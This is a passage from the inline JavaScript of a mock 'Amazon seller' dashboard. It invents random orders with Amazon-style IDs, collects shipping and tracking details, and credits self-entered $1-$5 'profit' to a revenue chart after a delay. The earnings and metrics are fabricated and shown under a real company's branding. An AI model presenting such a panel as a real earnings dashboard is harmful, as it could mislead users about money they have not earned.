        const dashboardPage = document.querySelector('.dashboard-page');
        const ordersPage = document.querySelector('.orders-page');
        const homeBtn = document.getElementById('home-btn');
        const ordersBtn = document.getElementById('orders-btn');
        const ordersBadge = document.getElementById('orders-badge');
        const recentOrdersTable = document.getElementById('recent-orders');
        const allOrdersTable = document.getElementById('all-orders');
        const orderModal = document.getElementById('order-modal');
        const closeModalBtns = document.querySelectorAll('.close-modal');
        const submitOrderBtn = document.getElementById('submit-order');
        const notification = document.getElementById('notification');
        const profitAmountSpan = document.getElementById('profit-amount');
        const ordersCountElement = document.getElementById('orders-count');
        const totalRevenueElement = document.getElementById('total-revenue');
        
        // Electronic products for random orders
        const electronicProducts = [
            "Smartphone X12 Pro",
            "4K Ultra HD Smart TV",
            "Wireless Noise-Canceling Headphones",
            "Laptop EliteBook 15",
            "Smart Watch Series 5",
            "Bluetooth Speaker",
            "Gaming Console X",
            "Digital Camera Pro",
            "Tablet Air 10.5",
            "Wireless Earbuds"
        ];

        // Customer names
        const customerNames = [
            "John Smith",
            "Sarah Johnson",
            "Michael Brown",
            "Emily Davis",
            "Robert Wilson",
            "Jessica Lee",
            "David Miller",
            "Jennifer Taylor",
            "Christopher Anderson",
            "Amanda Martinez"
        ];

        // Initialize the dashboard
        function initDashboard() {
            // Load data from localStorage
            loadFromLocalStorage();
            
            // Initialize chart
            initChart();
            
            // Start order generation
            startOrderGeneration();
            
            // Set up event listeners
            setupEventListeners();
            
            // Update metrics
            updateDashboardMetrics();
        }

        // Load data from localStorage
        function loadFromLocalStorage() {
            const savedData = localStorage.getItem('amazonSellerData');
            if (savedData) {
                const data = JSON.parse(savedData);
                totalRevenue = data.totalRevenue || 0;
                totalOrders = data.totalOrders || 0;
                pendingOrders = data.pendingOrders || [];
                completedOrders = data.completedOrders || [];
                currentOrderId = data.currentOrderId || 1000;
                lastOrderGenerationTime = data.lastOrderGenerationTime || 0;
                
                // Update UI
                updateOrdersBadge();
                updateAllOrderTables();
            }
        }

        // Save data to localStorage
        function saveToLocalStorage() {
            const data = {
                totalRevenue,
                totalOrders,
                pendingOrders,
                completedOrders,
                currentOrderId,
                lastOrderGenerationTime
            };
            localStorage.setItem('amazonSellerData', JSON.stringify(data));
        }

        // Initialize the chart
        function initChart() {
            const ctx = document.getElementById('amazonChart').getContext('2d');
            
            // Get the last 7 days
            const dates = [];
            for (let i = 6; i >= 0; i--) {
                const date = new Date();
                date.setDate(date.getDate() - i);
                dates.push(date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }));
            }
            
            // Get revenue data for the last 7 days
            const revenueData = Array(7).fill(0);
            completedOrders.forEach(order => {
                const orderDate = new Date(order.timestamp);
                const today = new Date();
                const diffTime = today - orderDate;
                const diffDays = Math.floor(diffTime / (1000 * 60 * 60 * 24));
                
                if (diffDays >= 0 && diffDays < 7) {
                    const profit = parseFloat(order.amount.substring(1));
                    revenueData[6 - diffDays] += profit;
                }
            });
            
            amazonChart = new Chart(ctx, {
                type: 'bar',
                data: {
                    labels: dates,
                    datasets: [{
                        label: 'Revenue',
                        data: revenueData,
                        backgroundColor: 'rgba(255, 153, 0, 0.7)',
                        borderColor: 'rgba(255, 153, 0, 1)',
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            display: false
                        }
                    },
                    scales: {
                        y: {
                            beginAtZero: true,
                            grid: {
                                color: 'rgba(61, 74, 92, 0.5)'
                            },
                            ticks: {
                                color: '#E1E1E1',
                                callback: function(value) {
                                    return '$' + value;
                                }
                            }
                        },
                        x: {
                            grid: {
                                display: false
                            },
                            ticks: {
                                color: '#E1E1E1'
                            }
                        }
                    }
                }
            });
        }

        // Update the chart with new data
        function updateChart() {
            // Get the last 7 days
            const dates = [];
            for (let i = 6; i >= 0; i--) {
                const date = new Date();
                date.setDate(date.getDate() - i);
                dates.push(date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }));
            }
            
            // Get revenue data for the last 7 days
            const revenueData = Array(7).fill(0);
            completedOrders.forEach(order => {
                const orderDate = new Date(order.timestamp);
                const today = new Date();
                const diffTime = today - orderDate;
                const diffDays = Math.floor(diffTime / (1000 * 60 * 60 * 24));
                
                if (diffDays >= 0 && diffDays < 7) {
                    const profit = parseFloat(order.amount.substring(1));
                    revenueData[6 - diffDays] += profit;
                }
            });
            
            // Update chart data
            amazonChart.data.labels = dates;
            amazonChart.data.datasets[0].data = revenueData;
            amazonChart.update();
        }

        // Start generating orders with the new pattern
        function startOrderGeneration() {
            const now = Date.now();
            const twoHours =  2* 60* 60 * 1000;
            
            // Check if we need to generate orders based on last generation time
            if (now - lastOrderGenerationTime >= twoHours) {
                const hoursSinceLast = Math.floor((now - lastOrderGenerationTime) / twoHours);
                const ordersToGenerate = Math.min(hoursSinceLast * (Math.floor(Math.random() * 3) + 1), 3 - pendingOrders.length);
                
                for (let i = 0; i < ordersToGenerate; i++) {
                    generateNewOrder();
                }
                
                lastOrderGenerationTime = now - (now % twoHours); // Align to the last 2-hour mark
                saveToLocalStorage();
            }
            
            // Set up the interval for future orders
            orderInterval = setInterval(() => {
                generateNewOrdersBatch();
            }, twoHours);
            
            // For demo purposes, we'll also generate an order immediately if none exist
            if (pendingOrders.length === 0) {
                setTimeout(generateNewOrder, 2000);
            }
        }

        // Generate a batch of new orders (1-3, but never more than 3 total)
        function generateNewOrdersBatch() {
            const availableSlots = 3 - pendingOrders.length;
            if (availableSlots <= 0) return;
            
            const ordersToGenerate = Math.min(Math.floor(Math.random() * 3) + 1, availableSlots);
            
            for (let i = 0; i < ordersToGenerate; i++) {
                generateNewOrder();
            }
            
            lastOrderGenerationTime = Date.now();
            saveToLocalStorage();
        }

        // Generate a new random order ($1-$5 range)
        function generateNewOrder() {
            // Don't generate if we already have 3 pending orders
            if (pendingOrders.length >= 3) {
                return;
            }
            
            currentOrderId++;
            
            const product = electronicProducts[Math.floor(Math.random() * electronicProducts.length)];
            const customer = customerNames[Math.floor(Math.random() * customerNames.length)];
            const amount = (Math.random() * 6 + 1).toFixed(2); // $1-$5 orders
            
            const now = new Date();
            const orderDate = now.toLocaleDateString('en-US', { 
                month: 'short', 
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit'
            });
            
            const order = {
                id: `112-${currentOrderId}-4105643`,
                product: product,
                date: orderDate,
                customer: customer,
                status: "Pending",
                amount: `$${amount}`,
                timestamp: now.getTime()
            };
            
            pendingOrders.push(order);
            updateOrdersBadge();
            addOrderToTable(order, recentOrdersTable);
            addOrderToTable(order, allOrdersTable);
            saveToLocalStorage();
            
            // Show notification for new order
            showNotification(`New order received: ${product}`);
        }

        // Add order to a table
        function addOrderToTable(order, table) {
            const row = document.createElement('tr');
            
            row.innerHTML = `
                <td>${order.id.substring(0, 10)}...</td>
                ${table === allOrdersTable ? `<td>${order.product}</td>` : ''}
                <td>${order.date}</td>
                <td>${order.customer}</td>
                <td><span class="order-status status-pending">${order.status}</span></td>
                <td>${order.amount}</td>
                <td><button class="btn view-order" data-order='${JSON.stringify(order)}' style="padding: 5px 8px; font-size: 11px;">View</button></td>
            `;
            
            table.prepend(row);
            
            // Add event listener to the new button
            row.querySelector('.view-order').addEventListener('click', function() {
                openOrderModal(JSON.parse(this.getAttribute('data-order')));
            });
        }

        // Update orders badge count
        function updateOrdersBadge() {
            ordersBadge.textContent = pendingOrders.length;
            if (pendingOrders.length > 0) {
                ordersBadge.style.display = 'inline-block';
            } else {
                ordersBadge.style.display = 'none';
            }
        }

        // Open order modal
        function openOrderModal(order) {
            document.getElementById('order-id').value = order.id;
            orderModal.style.display = 'flex';
        }

        // Close order modal
        function closeOrderModal() {
            orderModal.style.display = 'none';
        }

        // Submit order details
        function submitOrder(orderId) {
            const sellerLocation = document.getElementById('seller-location').value;
            const packageId = document.getElementById('package-id').value;
            const trackId = document.getElementById('track-id').value;
            const profit = parseFloat(document.getElementById('profit').value);
            
            if (!sellerLocation || !packageId || !trackId || isNaN(profit) || profit < 1 || profit > 5) {
                alert('Please fill all fields with valid data (profit must be between $1 and $5)');
                return;
            }
            
            // Find the order in pending orders
            const orderIndex = pendingOrders.findIndex(o => o.id === orderId);
            if (orderIndex !== -1) {
                const order = pendingOrders[orderIndex];
                
                // Update order status
                order.status = "Shipped";
                
                // Move to completed orders
                pendingOrders.splice(orderIndex, 1);
                completedOrders.push(order);
                
                // Update UI
                updateOrdersBadge();
                updateAllOrderTables();
                
                // Update revenue after 1 minute
                setTimeout(() => {
                    totalRevenue += profit;
                    totalOrders++;
                    updateDashboardMetrics();
                    updateChart();
                    showNotification(`Profit of $${profit.toFixed(2)} has been added to your dashboard!`);
                    saveToLocalStorage();
                }, 60000); // 1 minute
                
                // Close modal
                closeOrderModal();
                
                // Clear form
                document.getElementById('seller-location').value = '';
                document.getElementById('package-id').value = '';
                document.getElementById('track-id').value = '';
                document.getElementById('profit').value = '';
                
                saveToLocalStorage();
            }
        }

        // Update all order tables
        function updateAllOrderTables() {
            // Clear tables
            recentOrdersTable.innerHTML = '';
            allOrdersTable.innerHTML = '';
            
            // Add pending orders (most recent first, max 5 for recent orders)
            const recentPending = [...pendingOrders].reverse().slice(0, 5);
            recentPending.forEach(order => {
                addOrderToTable(order, recentOrdersTable);
            });
            
            // Add all pending and completed orders to all orders table
            const allOrders = [...pendingOrders, ...completedOrders].reverse();
            allOrders.forEach(order => {
                addOrderToTable(order, allOrdersTable);
            });
        }

        // Update dashboard metrics
        function updateDashboardMetrics() {
            ordersCountElement.textContent = totalOrders;
            totalRevenueElement.textContent = `$${totalRevenue.toFixed(2)}`;
            
            // Calculate conversion rate (simplified for demo)
            const conversionRate = totalOrders > 0 ? (Math.random() * 5 + 1).toFixed(1) : 0;
            document.querySelectorAll('.metric-value')[2].textContent = `${conversionRate}%`;
            
            // Calculate messages (simplified for demo)
            const messages = totalOrders > 0 ? Math.floor(totalOrders * 0.7) : 0;
            document.querySelectorAll('.metric-value')[3].textContent = messages;
        }

        // Show notification
        function showNotification(message) {
            const profitMatch = message.match(/\$\d+\.\d+/);
            if (profitMatch) {
                profitAmountSpan.textContent = profitMatch[0].substring(1);
            }
            notification.textContent = message;
            notification.style.display = 'block';
            setTimeout(() => {
                notification.style.display = 'none';
            }, 5000);
        }

        // Set up event listeners
        function setupEventListeners() {
            // Navigation buttons
            homeBtn.addEventListener('click', function(e) {
                e.preventDefault();
                dashboardPage.style.display = 'block';
                ordersPage.style.display = 'none';
                homeBtn.classList.add('active');
                ordersBtn.classList.remove('active');
            });
            
            ordersBtn.addEventListener('click', function(e) {
                e.preventDefault();
                dashboardPage.style.display = 'none';
                ordersPage.style.display = 'block';
                homeBtn.classList.remove('active');
                ordersBtn.classList.add('active');
            });
            
            // Modal buttons
            closeModalBtns.forEach(btn => {
                btn.addEventListener('click', function() {
                    if (this.classList.contains('close-modal')) {
                        orderModal.style.display = 'none';
                    }
                });
            });
            
            submitOrderBtn.addEventListener('click', function() {
                const orderId = document.getElementById('order-id').value;
                submitOrder(orderId);
            });
            
            // Close modal when clicking outside
            orderModal.addEventListener('click', function(e) {
                if (e.target === orderModal) {
                    closeOrderModal();
                }
            });
            
            // Profit input validation
            document.getElementById('profit').addEventListener('change', function() {
                const value = parseFloat(this.value);
                if (isNaN(value) || value < 1 || value > 5) {
                    this.value = '';
                    alert('Profit must be between $1 and $5');
                }
            });
        }

        // Initialize the dashboard when DOM is loaded
        document.addEventListener('DOMContentLoaded', initDashboard);
    </script>
</body>
</html>
